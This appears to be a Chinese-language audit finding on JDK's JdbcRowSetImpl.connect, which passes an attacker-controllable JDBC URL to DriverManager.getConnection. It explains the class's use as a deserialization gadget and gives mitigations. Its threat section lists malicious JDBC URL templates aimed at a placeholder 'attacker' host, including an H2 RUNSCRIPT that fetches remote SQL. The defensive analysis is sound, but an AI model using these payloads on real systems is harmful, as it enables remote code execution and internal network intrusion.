# 05. [Sink/SNK-2] JDBC 连接 — com.sun.rowset.JdbcRowSetImpl.connect

| 项目 | 内容 |
|------|------|
| 规则 | SNK-2（DriverManager.getConnection 动态 JDBC URL） |
| 严重级别 | Medium（RowSet URL 属性可被调用方/反序列化数据控制） |
| 位置 | `java.sql.rowset/com/sun/rowset/JdbcRowSetImpl.java:642-643`（`DriverManager.getConnection(getUrl(), getUsername(), getPassword())`） |
| 模块 | java.sql.rowset |

## 1. 在 JDK 中的作用

`JdbcRowSetImpl` 是 RowSet 参考实现之一，提供"对象化 JDBC 结果集"：把连接、命令、结果缓存封装成 JavaBeans 风格组件。`connect()`（本文件 L~610-649）是执行链路枢纽：

- 优先使用调用方注入的 `Connection`（conn != null）;
- 其次 `getDataSourceName()` 非空 → JNDI `InitialContext.lookup` 取 DataSource（L622-624，该路径属 JNDI 注入面，**不在本技能范围**，此处不展开）;
- 最后 `getUrl()` 非空 → **`DriverManager.getConnection(getUrl(), getUsername(), getPassword())`**（L642-643）—— URL、用户名、密码均为 RowSet 属性，`setUrl` 赋值。

执行触发点：`execute()`/`executeQuery()` → `prepare()`（L652-662）→ `connect()`。

## 2. 使用方式（如何使用）

- 应用：`JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setUrl("jdbc:mysql://db:3306/x"); rs.setUsername(...); rs.execute();`
- **历史高危用法**：`JdbcRowSetImpl` 是 Java 序列化 gadget 链的经典组件（ysoserial 家族）——攻击者构造序列化数据，其中 `url`/`username`/`password` 字段被改为恶意 JDBC 串，受害应用反序列化后调用其任何方法（如 `getDatabaseMetaData`/`next()`/`execute` 或 gadget 链要求的任意触发方法）即触发 `connect()`。

## 3. 触发条件分析（什么情况下触发）

**JDBC URL 到达 getConnection 的条件**：

1. RowSet 实例的 `url` 属性被设置为攻击者可控值：
   - 直接场景：应用把用户输入写入 `setUrl`（典型误配）;
   - 反序列化场景：攻击者控制的序列化流包含 `JdbcRowSetImpl`（或链中其他 RowSet 类型）且流被应用反序列化 → 属性随之被覆盖;
2. 应用随后调用任何触发 `connect()` 的方法（`execute`、`executeQuery`、`getConnection` 相关 getter 链等）;
3. 攻击者 URL 所指的 JDBC 驱动在 classpath 中（MySQL Connector/J、H2、PostgreSQL 等常见驱动自带）——否则 `getConnection` 报"无驱动"（但仍可注册任意驱动：SNK-1 侧 `DriverManager` 的 `Class.forName` 加载路径可被配合）。

**威胁载荷形态**：
- `jdbc:mysql://attacker:3306/db?autoDeserialize=true&queryInterceptors=...`（Connector/J 特征）→ 服务端反序列化;
- `jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'` → H2 任意 SQL/类加载;
- `jdbc:postgresql://attacker:5432/x?socketFactory=...`（PG JDBC 特征）→ 任意类实例化;
- 任意 `jdbc:<anything>://<内网 IP>:<port>/` → **SSRF/内网端口扫描**（连接行为本身即是探测）。

**fd 缓存问题**：不在本条范围（连接由 DriverManager/驱动管理；RowSet 不缓存 fd）。若配合 H2 等将 URL 指向本地文件，文件访问由对应驱动负责。

## 4. 威胁场景与影响

- Web 应用存在任意反序列化点（无 ObjectInputFilter）→ 投递 JdbcRowSetImpl gadget → 应用进程向攻击者指定的数据库/内网地址建立真实 TCP 连接 → **RCE（经恶意 JDBC 驱动特性）/ SSRF / 内网探测**;
- 若应用将查询参数拼入 JDBC URL（罕见），等价直接可控。

## 5. 缓解与修复建议

- 反序列化入口一律配置 `ObjectInputFilter`，阻断 `com.sun.rowset.*` 与第三方 gadget 类;
- 应用不向 `setUrl` 传入外部输入；JDBC URL 来源限定为受信配置;
- 出站防火墙限制数据库端口方向（缓解 SSRF 面）。

## 6. 审计结论

分级复核：**维持 Medium**。RowSet 是"调用方提供连接参数"的常规 API，无害；危害完全取决于 RowSet 对象的来源（配置 vs 反序列化数据）。存在反序列化入口且无过滤器时，本条实际等价 High（RCE 链）。注意：同一 `connect()` 中的 JNDI lookup 分支（L622）属 JNDI 注入，在技能范围外，仅此注明。